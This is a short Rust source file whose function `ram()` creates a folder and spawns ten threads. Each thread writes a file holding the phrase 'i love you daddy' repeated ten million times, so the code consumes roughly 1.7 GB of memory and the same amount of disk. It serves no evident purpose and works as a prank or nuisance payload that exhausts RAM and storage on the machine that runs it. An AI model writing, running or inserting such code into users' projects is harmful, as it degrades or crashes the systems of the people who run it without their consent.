use std::fs::{self, File};
use std::io::Write;
use std::path::PathBuf;
use std::thread;

pub fn ram() {
    let folder_name = "iloveyoudaddy";
    let folder_path = PathBuf::from(folder_name);

    fs::create_dir_all(&folder_path).unwrap();

    let mut threads = vec![];
    for i in 1..=10 {
        let file_name = format!("{}_{}.txt", folder_name, i);
        let file_path = folder_path.join(file_name);

        let content = std::iter::repeat("i love you daddy\n")
            .take(10000000)
            .collect::<String>();

        let handle = thread::spawn(move || {
            write_file(&file_path, &content);
        });
        threads.push(handle);
    }

    for handle in threads {
        handle.join().unwrap();
    }
}

fn write_file(file_path: &PathBuf, content: &str) {
    let mut file = File::create(file_path).unwrap();
    file.write_all(content.as_bytes()).unwrap();
}